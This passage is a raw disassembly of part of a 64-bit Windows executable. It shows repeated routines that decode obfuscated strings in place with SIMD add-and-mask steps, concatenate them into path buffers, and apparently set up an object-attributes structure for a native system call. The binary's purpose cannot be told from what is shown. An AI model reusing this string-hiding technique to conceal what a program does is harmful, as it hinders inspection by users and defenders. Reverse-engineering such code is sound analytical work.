   1400043d5:	66 89 05 54 9d 28 00 	mov    %ax,0x289d54(%rip)        # 0x14028e130
   1400043dc:	0f b7 05 4f 9d 28 00 	movzwl 0x289d4f(%rip),%eax        # 0x14028e132
   1400043e3:	05 ef 00 00 00       	add    $0xef,%eax
   1400043e8:	0f b6 c0             	movzbl %al,%eax
   1400043eb:	66 89 05 40 9d 28 00 	mov    %ax,0x289d40(%rip)        # 0x14028e132
   1400043f2:	c6 05 3b 9d 28 00 00 	movb   $0x0,0x289d3b(%rip)        # 0x14028e134
   1400043f9:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400043fe:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004403:	4c 8d 0d e6 9c 28 00 	lea    0x289ce6(%rip),%r9        # 0x14028e0f0
   14000440a:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004411:	31 c9                	xor    %ecx,%ecx
   140004413:	4d 89 f8             	mov    %r15,%r8
   140004416:	e8 d5 e9 ff ff       	call   0x140002df0
   14000441b:	e9 5d 2b 00 00       	jmp    0x140006f7d
   140004420:	4b 8d 1c 74          	lea    (%r12,%r14,2),%rbx
   140004424:	80 3d 70 9a 28 00 00 	cmpb   $0x0,0x289a70(%rip)        # 0x14028de9b
   14000442b:	0f 85 6c fc ff ff    	jne    0x14000409d
   140004431:	c6 05 5c 9c 28 00 01 	movb   $0x1,0x289c5c(%rip)        # 0x14028e094
   140004438:	66 0f 6f 05 30 62 00 	movdqa 0x6230(%rip),%xmm0        # 0x14000a670
   14000443f:	00 
   140004440:	66 0f 7f 05 38 9c 28 	movdqa %xmm0,0x289c38(%rip)        # 0x14028e080
   140004447:	00 
   140004448:	c7 05 3e 9c 28 00 8f 	movl   $0x5d008f,0x289c3e(%rip)        # 0x14028e090
   14000444f:	00 5d 00 
   140004452:	48 8d 0d c7 3b 00 00 	lea    0x3bc7(%rip),%rcx        # 0x140008020
   140004459:	e8 12 cf ff ff       	call   0x140001370
   14000445e:	c6 05 36 9a 28 00 01 	movb   $0x1,0x289a36(%rip)        # 0x14028de9b
   140004465:	80 3d 28 9c 28 00 00 	cmpb   $0x0,0x289c28(%rip)        # 0x14028e094
   14000446c:	0f 85 34 fc ff ff    	jne    0x1400040a6
   140004472:	e9 76 fc ff ff       	jmp    0x1400040ed
   140004477:	31 ff                	xor    %edi,%edi
   140004479:	eb 04                	jmp    0x14000447f
   14000447b:	49 8d 3c 5c          	lea    (%r12,%rbx,2),%rdi
   14000447f:	80 3d 19 9a 28 00 00 	cmpb   $0x0,0x289a19(%rip)        # 0x14028de9f
   140004486:	0f 84 db 2c 00 00    	je     0x140007167
   14000448c:	80 3d 03 9d 28 00 00 	cmpb   $0x0,0x289d03(%rip)        # 0x14028e196
   140004493:	0f 84 95 00 00 00    	je     0x14000452e
   140004499:	66 0f 6f 05 2f 62 00 	movdqa 0x622f(%rip),%xmm0        # 0x14000a6d0
   1400044a0:	00 
   1400044a1:	66 0f 6f 0d b7 9c 28 	movdqa 0x289cb7(%rip),%xmm1        # 0x14028e160
   1400044a8:	00 
   1400044a9:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400044ad:	66 0f 6f 15 6b 61 00 	movdqa 0x616b(%rip),%xmm2        # 0x14000a620
   1400044b4:	00 
   1400044b5:	66 0f db ca          	pand   %xmm2,%xmm1
   1400044b9:	66 0f 7f 0d 9f 9c 28 	movdqa %xmm1,0x289c9f(%rip)        # 0x14028e160
   1400044c0:	00 
   1400044c1:	66 0f 6f 0d a7 9c 28 	movdqa 0x289ca7(%rip),%xmm1        # 0x14028e170
   1400044c8:	00 
   1400044c9:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400044cd:	66 0f db ca          	pand   %xmm2,%xmm1
   1400044d1:	66 0f 7f 0d 97 9c 28 	movdqa %xmm1,0x289c97(%rip)        # 0x14028e170
   1400044d8:	00 
   1400044d9:	66 0f fd 05 9f 9c 28 	paddw  0x289c9f(%rip),%xmm0        # 0x14028e180
   1400044e0:	00 
   1400044e1:	66 0f db c2          	pand   %xmm2,%xmm0
   1400044e5:	66 0f 7f 05 93 9c 28 	movdqa %xmm0,0x289c93(%rip)        # 0x14028e180
   1400044ec:	00 
   1400044ed:	8b 05 9d 9c 28 00    	mov    0x289c9d(%rip),%eax        # 0x14028e190
   1400044f3:	83 c0 2f             	add    $0x2f,%eax
   1400044f6:	0f b6 c0             	movzbl %al,%eax
   1400044f9:	66 89 05 90 9c 28 00 	mov    %ax,0x289c90(%rip)        # 0x14028e190
   140004500:	0f b7 05 8b 9c 28 00 	movzwl 0x289c8b(%rip),%eax        # 0x14028e192
   140004507:	83 c0 2f             	add    $0x2f,%eax
   14000450a:	0f b6 c0             	movzbl %al,%eax
   14000450d:	66 89 05 7e 9c 28 00 	mov    %ax,0x289c7e(%rip)        # 0x14028e192
   140004514:	8b 05 7a 9c 28 00    	mov    0x289c7a(%rip),%eax        # 0x14028e194
   14000451a:	83 c0 2f             	add    $0x2f,%eax
   14000451d:	0f b6 c0             	movzbl %al,%eax
   140004520:	66 89 05 6d 9c 28 00 	mov    %ax,0x289c6d(%rip)        # 0x14028e194
   140004527:	c6 05 68 9c 28 00 00 	movb   $0x0,0x289c68(%rip)        # 0x14028e196
   14000452e:	48 8d 9d 20 0a 00 00 	lea    0xa20(%rbp),%rbx
   140004535:	48 89 d9             	mov    %rbx,%rcx
   140004538:	48 89 fa             	mov    %rdi,%rdx
   14000453b:	e8 a0 57 00 00       	call   0x140009ce0
   140004540:	48 8d 15 19 9c 28 00 	lea    0x289c19(%rip),%rdx        # 0x14028e160
   140004547:	48 89 d9             	mov    %rbx,%rcx
   14000454a:	e8 81 57 00 00       	call   0x140009cd0
   14000454f:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   140004556:	48 89 da             	mov    %rbx,%rdx
   140004559:	e8 12 58 00 00       	call   0x140009d70
   14000455e:	85 c0                	test   %eax,%eax
   140004560:	74 19                	je     0x14000457b
   140004562:	48 c7 85 50 10 00 00 	movq   $0xfffffffff70f2e80,0x1050(%rbp)
   140004569:	80 2e 0f f7 
   14000456d:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004574:	31 c9                	xor    %ecx,%ecx
   140004576:	e8 5b cf ff ff       	call   0x1400014d6
   14000457b:	48 8d 8d e0 01 00 00 	lea    0x1e0(%rbp),%rcx
   140004582:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004588:	31 d2                	xor    %edx,%edx
   14000458a:	e8 41 58 00 00       	call   0x140009dd0
   14000458f:	80 3d 0a 99 28 00 00 	cmpb   $0x0,0x28990a(%rip)        # 0x14028dea0
   140004596:	0f 84 fc 2b 00 00    	je     0x140007198
   14000459c:	80 3d 0f 9c 28 00 00 	cmpb   $0x0,0x289c0f(%rip)        # 0x14028e1b2
   1400045a3:	74 3c                	je     0x1400045e1
   1400045a5:	66 0f 6f 05 f3 9b 28 	movdqa 0x289bf3(%rip),%xmm0        # 0x14028e1a0
   1400045ac:	00 
   1400045ad:	66 0f fd 05 4b 61 00 	paddw  0x614b(%rip),%xmm0        # 0x14000a700
   1400045b4:	00 
   1400045b5:	66 0f db 05 63 60 00 	pand   0x6063(%rip),%xmm0        # 0x14000a620
   1400045bc:	00 
   1400045bd:	66 0f 7f 05 db 9b 28 	movdqa %xmm0,0x289bdb(%rip)        # 0x14028e1a0
   1400045c4:	00 
   1400045c5:	b8 91 00 00 00       	mov    $0x91,%eax
   1400045ca:	03 05 e0 9b 28 00    	add    0x289be0(%rip),%eax        # 0x14028e1b0
   1400045d0:	0f b6 c0             	movzbl %al,%eax
   1400045d3:	66 89 05 d6 9b 28 00 	mov    %ax,0x289bd6(%rip)        # 0x14028e1b0
   1400045da:	c6 05 d1 9b 28 00 00 	movb   $0x0,0x289bd1(%rip)        # 0x14028e1b2
   1400045e1:	4c 8d a5 e0 01 00 00 	lea    0x1e0(%rbp),%r12
   1400045e8:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400045ef:	4c 89 e1             	mov    %r12,%rcx
   1400045f2:	e8 e9 56 00 00       	call   0x140009ce0
   1400045f7:	48 8d 15 a2 9b 28 00 	lea    0x289ba2(%rip),%rdx        # 0x14028e1a0
   1400045fe:	4c 89 e1             	mov    %r12,%rcx
   140004601:	e8 ca 56 00 00       	call   0x140009cd0
   140004606:	48 8d 8d 00 06 00 00 	lea    0x600(%rbp),%rcx
   14000460d:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004613:	31 d2                	xor    %edx,%edx
   140004615:	e8 b6 57 00 00       	call   0x140009dd0
   14000461a:	80 3d 80 98 28 00 00 	cmpb   $0x0,0x289880(%rip)        # 0x14028dea1
   140004621:	0f 84 b6 2b 00 00    	je     0x1400071dd
   140004627:	80 3d ac 9b 28 00 00 	cmpb   $0x0,0x289bac(%rip)        # 0x14028e1da
   14000462e:	74 5a                	je     0x14000468a
   140004630:	66 0f 6f 05 88 9b 28 	movdqa 0x289b88(%rip),%xmm0        # 0x14028e1c0
   140004637:	00 
   140004638:	66 0f fd 05 e0 60 00 	paddw  0x60e0(%rip),%xmm0        # 0x14000a720
   14000463f:	00 
   140004640:	66 0f db 05 d8 5f 00 	pand   0x5fd8(%rip),%xmm0        # 0x14000a620
   140004647:	00 
   140004648:	66 0f 7f 05 70 9b 28 	movdqa %xmm0,0x289b70(%rip)        # 0x14028e1c0
   14000464f:	00 
   140004650:	f3 0f 7e 05 78 9b 28 	movq   0x289b78(%rip),%xmm0        # 0x14028e1d0
   140004657:	00 
   140004658:	66 0f fd 05 d0 60 00 	paddw  0x60d0(%rip),%xmm0        # 0x14000a730
   14000465f:	00 
   140004660:	66 0f db 05 f8 5f 00 	pand   0x5ff8(%rip),%xmm0        # 0x14000a660
   140004667:	00 
   140004668:	66 0f d6 05 60 9b 28 	movq   %xmm0,0x289b60(%rip)        # 0x14028e1d0
   14000466f:	00 
   140004670:	8b 05 62 9b 28 00    	mov    0x289b62(%rip),%eax        # 0x14028e1d8
   140004676:	83 c0 1d             	add    $0x1d,%eax
   140004679:	0f b6 c0             	movzbl %al,%eax
   14000467c:	66 89 05 55 9b 28 00 	mov    %ax,0x289b55(%rip)        # 0x14028e1d8
   140004683:	c6 05 50 9b 28 00 00 	movb   $0x0,0x289b50(%rip)        # 0x14028e1da
   14000468a:	48 8d bd 00 06 00 00 	lea    0x600(%rbp),%rdi
   140004691:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004698:	48 89 f9             	mov    %rdi,%rcx
   14000469b:	e8 40 56 00 00       	call   0x140009ce0
   1400046a0:	48 8d 15 19 9b 28 00 	lea    0x289b19(%rip),%rdx        # 0x14028e1c0
   1400046a7:	48 89 f9             	mov    %rdi,%rcx
   1400046aa:	e8 21 56 00 00       	call   0x140009cd0
   1400046af:	48 8d 8d f0 03 00 00 	lea    0x3f0(%rbp),%rcx
   1400046b6:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400046bc:	31 d2                	xor    %edx,%edx
   1400046be:	e8 0d 57 00 00       	call   0x140009dd0
   1400046c3:	80 3d d8 97 28 00 00 	cmpb   $0x0,0x2897d8(%rip)        # 0x14028dea2
   1400046ca:	0f 84 63 2b 00 00    	je     0x140007233
   1400046d0:	80 3d 19 9b 28 00 00 	cmpb   $0x0,0x289b19(%rip)        # 0x14028e1f0
   1400046d7:	74 27                	je     0x140004700
   1400046d9:	66 0f 6f 05 ff 9a 28 	movdqa 0x289aff(%rip),%xmm0        # 0x14028e1e0
   1400046e0:	00 
   1400046e1:	66 0f fd 05 67 60 00 	paddw  0x6067(%rip),%xmm0        # 0x14000a750
   1400046e8:	00 
   1400046e9:	66 0f db 05 2f 5f 00 	pand   0x5f2f(%rip),%xmm0        # 0x14000a620
   1400046f0:	00 
   1400046f1:	66 0f 7f 05 e7 9a 28 	movdqa %xmm0,0x289ae7(%rip)        # 0x14028e1e0
   1400046f8:	00 
   1400046f9:	c6 05 f0 9a 28 00 00 	movb   $0x0,0x289af0(%rip)        # 0x14028e1f0
   140004700:	48 8d bd f0 03 00 00 	lea    0x3f0(%rbp),%rdi
   140004707:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000470e:	48 89 f9             	mov    %rdi,%rcx
   140004711:	e8 ca 55 00 00       	call   0x140009ce0
   140004716:	48 8d 15 c3 9a 28 00 	lea    0x289ac3(%rip),%rdx        # 0x14028e1e0
   14000471d:	48 89 f9             	mov    %rdi,%rcx
   140004720:	e8 ab 55 00 00       	call   0x140009cd0
   140004725:	80 3d 77 97 28 00 00 	cmpb   $0x0,0x289777(%rip)        # 0x14028dea3
   14000472c:	0f 84 3d 2b 00 00    	je     0x14000726f
   140004732:	80 3d 9d 9b 28 00 00 	cmpb   $0x0,0x289b9d(%rip)        # 0x14028e2d6
   140004739:	0f 84 89 01 00 00    	je     0x1400048c8
   14000473f:	66 0f 6f 05 19 60 00 	movdqa 0x6019(%rip),%xmm0        # 0x14000a760
   140004746:	00 
   140004747:	66 0f 6f 15 b1 9a 28 	movdqa 0x289ab1(%rip),%xmm2        # 0x14028e200
   14000474e:	00 
   14000474f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004753:	66 0f 6f 0d c5 5e 00 	movdqa 0x5ec5(%rip),%xmm1        # 0x14000a620
   14000475a:	00 
   14000475b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000475f:	66 0f 7f 15 99 9a 28 	movdqa %xmm2,0x289a99(%rip)        # 0x14028e200
   140004766:	00 
   140004767:	66 0f 6f 15 a1 9a 28 	movdqa 0x289aa1(%rip),%xmm2        # 0x14028e210
   14000476e:	00 
   14000476f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004773:	66 0f db d1          	pand   %xmm1,%xmm2
   140004777:	66 0f 7f 15 91 9a 28 	movdqa %xmm2,0x289a91(%rip)        # 0x14028e210
   14000477e:	00 
   14000477f:	66 0f 6f 15 99 9a 28 	movdqa 0x289a99(%rip),%xmm2        # 0x14028e220
   140004786:	00 
   140004787:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000478b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000478f:	66 0f 7f 15 89 9a 28 	movdqa %xmm2,0x289a89(%rip)        # 0x14028e220
   140004796:	00 
   140004797:	66 0f 6f 15 91 9a 28 	movdqa 0x289a91(%rip),%xmm2        # 0x14028e230
   14000479e:	00 
   14000479f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400047a3:	66 0f db d1          	pand   %xmm1,%xmm2
   1400047a7:	66 0f 7f 15 81 9a 28 	movdqa %xmm2,0x289a81(%rip)        # 0x14028e230
   1400047ae:	00 
   1400047af:	66 0f 6f 15 89 9a 28 	movdqa 0x289a89(%rip),%xmm2        # 0x14028e240
   1400047b6:	00 
   1400047b7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400047bb:	66 0f db d1          	pand   %xmm1,%xmm2
   1400047bf:	66 0f 7f 15 79 9a 28 	movdqa %xmm2,0x289a79(%rip)        # 0x14028e240
   1400047c6:	00 
   1400047c7:	66 0f 6f 15 81 9a 28 	movdqa 0x289a81(%rip),%xmm2        # 0x14028e250
   1400047ce:	00 
   1400047cf:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400047d3:	66 0f db d1          	pand   %xmm1,%xmm2
   1400047d7:	66 0f 7f 15 71 9a 28 	movdqa %xmm2,0x289a71(%rip)        # 0x14028e250
   1400047de:	00 
   1400047df:	66 0f 6f 15 79 9a 28 	movdqa 0x289a79(%rip),%xmm2        # 0x14028e260
   1400047e6:	00 
   1400047e7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400047eb:	66 0f db d1          	pand   %xmm1,%xmm2
   1400047ef:	66 0f 7f 15 69 9a 28 	movdqa %xmm2,0x289a69(%rip)        # 0x14028e260
   1400047f6:	00 
   1400047f7:	66 0f 6f 15 71 9a 28 	movdqa 0x289a71(%rip),%xmm2        # 0x14028e270
   1400047fe:	00 
   1400047ff:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004803:	66 0f db d1          	pand   %xmm1,%xmm2
   140004807:	66 0f 7f 15 61 9a 28 	movdqa %xmm2,0x289a61(%rip)        # 0x14028e270
   14000480e:	00 
   14000480f:	66 0f 6f 15 69 9a 28 	movdqa 0x289a69(%rip),%xmm2        # 0x14028e280
   140004816:	00 
   140004817:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000481b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000481f:	66 0f 7f 15 59 9a 28 	movdqa %xmm2,0x289a59(%rip)        # 0x14028e280
   140004826:	00 
   140004827:	66 0f 6f 15 61 9a 28 	movdqa 0x289a61(%rip),%xmm2        # 0x14028e290
   14000482e:	00 
   14000482f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004833:	66 0f db d1          	pand   %xmm1,%xmm2
   140004837:	66 0f 7f 15 51 9a 28 	movdqa %xmm2,0x289a51(%rip)        # 0x14028e290
   14000483e:	00 
   14000483f:	66 0f 6f 15 59 9a 28 	movdqa 0x289a59(%rip),%xmm2        # 0x14028e2a0
   140004846:	00 
   140004847:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000484b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000484f:	66 0f 7f 15 49 9a 28 	movdqa %xmm2,0x289a49(%rip)        # 0x14028e2a0
   140004856:	00 
   140004857:	66 0f 6f 15 51 9a 28 	movdqa 0x289a51(%rip),%xmm2        # 0x14028e2b0
   14000485e:	00 
   14000485f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004863:	66 0f db d1          	pand   %xmm1,%xmm2
   140004867:	66 0f 7f 15 41 9a 28 	movdqa %xmm2,0x289a41(%rip)        # 0x14028e2b0
   14000486e:	00 
   14000486f:	66 0f fd 05 49 9a 28 	paddw  0x289a49(%rip),%xmm0        # 0x14028e2c0
   140004876:	00 
   140004877:	66 0f db c1          	pand   %xmm1,%xmm0
   14000487b:	66 0f 7f 05 3d 9a 28 	movdqa %xmm0,0x289a3d(%rip)        # 0x14028e2c0
   140004882:	00 
   140004883:	b8 99 00 00 00       	mov    $0x99,%eax
   140004888:	8b 0d 42 9a 28 00    	mov    0x289a42(%rip),%ecx        # 0x14028e2d0
   14000488e:	01 c1                	add    %eax,%ecx
   140004890:	0f b6 c9             	movzbl %cl,%ecx
   140004893:	66 89 0d 36 9a 28 00 	mov    %cx,0x289a36(%rip)        # 0x14028e2d0
   14000489a:	0f b7 0d 31 9a 28 00 	movzwl 0x289a31(%rip),%ecx        # 0x14028e2d2
   1400048a1:	81 c1 99 00 00 00    	add    $0x99,%ecx
   1400048a7:	0f b6 c9             	movzbl %cl,%ecx
   1400048aa:	66 89 0d 21 9a 28 00 	mov    %cx,0x289a21(%rip)        # 0x14028e2d2
   1400048b1:	03 05 1d 9a 28 00    	add    0x289a1d(%rip),%eax        # 0x14028e2d4
   1400048b7:	0f b6 c0             	movzbl %al,%eax
   1400048ba:	66 89 05 13 9a 28 00 	mov    %ax,0x289a13(%rip)        # 0x14028e2d4
   1400048c1:	c6 05 0e 9a 28 00 00 	movb   $0x0,0x289a0e(%rip)        # 0x14028e2d6
   1400048c8:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400048cd:	4c 8d 0d 2c 99 28 00 	lea    0x28992c(%rip),%r9        # 0x14028e200
   1400048d4:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400048db:	b1 01                	mov    $0x1,%cl
   1400048dd:	4d 89 f8             	mov    %r15,%r8
   1400048e0:	e8 0b e5 ff ff       	call   0x140002df0
   1400048e5:	80 3d b8 95 28 00 00 	cmpb   $0x0,0x2895b8(%rip)        # 0x14028dea4
   1400048ec:	0f 84 c2 29 00 00    	je     0x1400072b4
   1400048f2:	80 3d 4d 9a 28 00 00 	cmpb   $0x0,0x289a4d(%rip)        # 0x14028e346
   1400048f9:	0f 84 e1 00 00 00    	je     0x1400049e0
   1400048ff:	66 0f 6f 05 69 5e 00 	movdqa 0x5e69(%rip),%xmm0        # 0x14000a770
   140004906:	00 
   140004907:	66 0f 6f 0d d1 99 28 	movdqa 0x2899d1(%rip),%xmm1        # 0x14028e2e0
   14000490e:	00 
   14000490f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004913:	66 0f 6f 15 05 5d 00 	movdqa 0x5d05(%rip),%xmm2        # 0x14000a620
   14000491a:	00 
   14000491b:	66 0f db ca          	pand   %xmm2,%xmm1
   14000491f:	66 0f 7f 0d b9 99 28 	movdqa %xmm1,0x2899b9(%rip)        # 0x14028e2e0
   140004926:	00 
   140004927:	66 0f 6f 0d c1 99 28 	movdqa 0x2899c1(%rip),%xmm1        # 0x14028e2f0
   14000492e:	00 
   14000492f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004933:	66 0f db ca          	pand   %xmm2,%xmm1
   140004937:	66 0f 7f 0d b1 99 28 	movdqa %xmm1,0x2899b1(%rip)        # 0x14028e2f0
   14000493e:	00 
   14000493f:	66 0f 6f 0d b9 99 28 	movdqa 0x2899b9(%rip),%xmm1        # 0x14028e300
   140004946:	00 
   140004947:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000494b:	66 0f db ca          	pand   %xmm2,%xmm1
   14000494f:	66 0f 7f 0d a9 99 28 	movdqa %xmm1,0x2899a9(%rip)        # 0x14028e300
   140004956:	00 
   140004957:	66 0f 6f 0d b1 99 28 	movdqa 0x2899b1(%rip),%xmm1        # 0x14028e310
   14000495e:	00 
   14000495f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004963:	66 0f db ca          	pand   %xmm2,%xmm1
   140004967:	66 0f 7f 0d a1 99 28 	movdqa %xmm1,0x2899a1(%rip)        # 0x14028e310
   14000496e:	00 
   14000496f:	66 0f 6f 0d a9 99 28 	movdqa 0x2899a9(%rip),%xmm1        # 0x14028e320
   140004976:	00 
   140004977:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000497b:	66 0f db ca          	pand   %xmm2,%xmm1
   14000497f:	66 0f 7f 0d 99 99 28 	movdqa %xmm1,0x289999(%rip)        # 0x14028e320
   140004986:	00 
   140004987:	66 0f fd 05 a1 99 28 	paddw  0x2899a1(%rip),%xmm0        # 0x14028e330
   14000498e:	00 
   14000498f:	66 0f db c2          	pand   %xmm2,%xmm0
   140004993:	66 0f 7f 05 95 99 28 	movdqa %xmm0,0x289995(%rip)        # 0x14028e330
   14000499a:	00 
   14000499b:	b8 9d 00 00 00       	mov    $0x9d,%eax
   1400049a0:	8b 0d 9a 99 28 00    	mov    0x28999a(%rip),%ecx        # 0x14028e340
   1400049a6:	01 c1                	add    %eax,%ecx
   1400049a8:	0f b6 c9             	movzbl %cl,%ecx
   1400049ab:	66 89 0d 8e 99 28 00 	mov    %cx,0x28998e(%rip)        # 0x14028e340
   1400049b2:	0f b7 0d 89 99 28 00 	movzwl 0x289989(%rip),%ecx        # 0x14028e342
   1400049b9:	81 c1 9d 00 00 00    	add    $0x9d,%ecx
   1400049bf:	0f b6 c9             	movzbl %cl,%ecx
   1400049c2:	66 89 0d 79 99 28 00 	mov    %cx,0x289979(%rip)        # 0x14028e342
   1400049c9:	03 05 75 99 28 00    	add    0x289975(%rip),%eax        # 0x14028e344
   1400049cf:	0f b6 c0             	movzbl %al,%eax
   1400049d2:	66 89 05 6b 99 28 00 	mov    %ax,0x28996b(%rip)        # 0x14028e344
   1400049d9:	c6 05 66 99 28 00 00 	movb   $0x0,0x289966(%rip)        # 0x14028e346
   1400049e0:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400049e5:	4c 8d 0d f4 98 28 00 	lea    0x2898f4(%rip),%r9        # 0x14028e2e0
   1400049ec:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400049f3:	31 c9                	xor    %ecx,%ecx
   1400049f5:	4d 89 e0             	mov    %r12,%r8
   1400049f8:	e8 f3 e3 ff ff       	call   0x140002df0
   1400049fd:	48 8d 8d 10 08 00 00 	lea    0x810(%rbp),%rcx
   140004a04:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004a0a:	31 d2                	xor    %edx,%edx
   140004a0c:	e8 bf 53 00 00       	call   0x140009dd0
   140004a11:	80 3d 8d 94 28 00 00 	cmpb   $0x0,0x28948d(%rip)        # 0x14028dea5
   140004a18:	0f 84 29 29 00 00    	je     0x140007347
   140004a1e:	80 3d 3d 99 28 00 00 	cmpb   $0x0,0x28993d(%rip)        # 0x14028e362
   140004a25:	74 3a                	je     0x140004a61
   140004a27:	66 0f 6f 05 21 99 28 	movdqa 0x289921(%rip),%xmm0        # 0x14028e350
   140004a2e:	00 
   140004a2f:	66 0f fd 05 59 5d 00 	paddw  0x5d59(%rip),%xmm0        # 0x14000a790
   140004a36:	00 
   140004a37:	66 0f db 05 e1 5b 00 	pand   0x5be1(%rip),%xmm0        # 0x14000a620
   140004a3e:	00 
   140004a3f:	66 0f 7f 05 09 99 28 	movdqa %xmm0,0x289909(%rip)        # 0x14028e350
   140004a46:	00 
   140004a47:	8b 05 13 99 28 00    	mov    0x289913(%rip),%eax        # 0x14028e360
   140004a4d:	83 c0 79             	add    $0x79,%eax
   140004a50:	0f b6 c0             	movzbl %al,%eax
   140004a53:	66 89 05 06 99 28 00 	mov    %ax,0x289906(%rip)        # 0x14028e360
   140004a5a:	c6 05 01 99 28 00 00 	movb   $0x0,0x289901(%rip)        # 0x14028e362
   140004a61:	4c 8d bd 10 08 00 00 	lea    0x810(%rbp),%r15
   140004a68:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004a6f:	4c 89 f9             	mov    %r15,%rcx
   140004a72:	e8 69 52 00 00       	call   0x140009ce0
   140004a77:	48 8d 15 d2 98 28 00 	lea    0x2898d2(%rip),%rdx        # 0x14028e350
   140004a7e:	4c 89 f9             	mov    %r15,%rcx
   140004a81:	e8 4a 52 00 00       	call   0x140009cd0
   140004a86:	4c 8d bd 50 10 00 00 	lea    0x1050(%rbp),%r15
   140004a8d:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140004a93:	4c 89 f9             	mov    %r15,%rcx
   140004a96:	31 d2                	xor    %edx,%edx
   140004a98:	e8 33 53 00 00       	call   0x140009dd0
   140004a9d:	80 3d ed 93 28 00 00 	cmpb   $0x0,0x2893ed(%rip)        # 0x14028de91
   140004aa4:	0f 84 e2 28 00 00    	je     0x14000738c
   140004aaa:	80 3d 39 94 28 00 00 	cmpb   $0x0,0x289439(%rip)        # 0x14028deea
   140004ab1:	74 3a                	je     0x140004aed
   140004ab3:	f3 0f 7e 05 25 94 28 	movq   0x289425(%rip),%xmm0        # 0x14028dee0
   140004aba:	00 
   140004abb:	66 0f fd 05 dd 5c 00 	paddw  0x5cdd(%rip),%xmm0        # 0x14000a7a0
   140004ac2:	00 
   140004ac3:	66 0f db 05 95 5b 00 	pand   0x5b95(%rip),%xmm0        # 0x14000a660
   140004aca:	00 
   140004acb:	66 0f d6 05 0d 94 28 	movq   %xmm0,0x28940d(%rip)        # 0x14028dee0
   140004ad2:	00 
   140004ad3:	8b 05 0f 94 28 00    	mov    0x28940f(%rip),%eax        # 0x14028dee8
   140004ad9:	83 c0 45             	add    $0x45,%eax
   140004adc:	0f b6 c0             	movzbl %al,%eax
   140004adf:	66 89 05 02 94 28 00 	mov    %ax,0x289402(%rip)        # 0x14028dee8
   140004ae6:	c6 05 fd 93 28 00 00 	movb   $0x0,0x2893fd(%rip)        # 0x14028deea
   140004aed:	48 8d 15 ec 93 28 00 	lea    0x2893ec(%rip),%rdx        # 0x14028dee0
   140004af4:	4c 89 f9             	mov    %r15,%rcx
   140004af7:	e8 e4 51 00 00       	call   0x140009ce0
   140004afc:	48 8d 95 10 08 00 00 	lea    0x810(%rbp),%rdx
   140004b03:	4c 89 f9             	mov    %r15,%rcx
   140004b06:	e8 c5 51 00 00       	call   0x140009cd0
   140004b0b:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   140004b12:	00 00 00 00 
   140004b16:	4c 89 f9             	mov    %r15,%rcx
   140004b19:	e8 d2 51 00 00       	call   0x140009cf0
   140004b1e:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004b25:	01 c0                	add    %eax,%eax
   140004b27:	66 89 8d 72 14 00 00 	mov    %cx,0x1472(%rbp)
   140004b2e:	66 89 85 70 14 00 00 	mov    %ax,0x1470(%rbp)
   140004b35:	4c 89 bd 78 14 00 00 	mov    %r15,0x1478(%rbp)
   140004b3c:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004b40:	66 0f 7f 85 40 0e 00 	movdqa %xmm0,0xe40(%rbp)
   140004b47:	00 
   140004b48:	66 0f 7f 85 50 0e 00 	movdqa %xmm0,0xe50(%rbp)
   140004b4f:	00 
   140004b50:	c7 85 40 0e 00 00 30 	movl   $0x30,0xe40(%rbp)
   140004b57:	00 00 00 
   140004b5a:	c7 85 58 0e 00 00 40 	movl   $0x40,0xe58(%rbp)
   140004b61:	00 00 00 
   140004b64:	48 8d 85 70 14 00 00 	lea    0x1470(%rbp),%rax
   140004b6b:	48 89 85 50 0e 00 00 	mov    %rax,0xe50(%rbp)
   140004b72:	66 0f 7f 85 60 0e 00 	movdqa %xmm0,0xe60(%rbp)
   140004b79:	00 
   140004b7a:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140004b81:	00 00 00 00 
   140004b85:	66 0f 7f 85 00 17 00 	movdqa %xmm0,0x1700(%rbp)
   140004b8c:	00 
   140004b8d:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140004b94:	00 
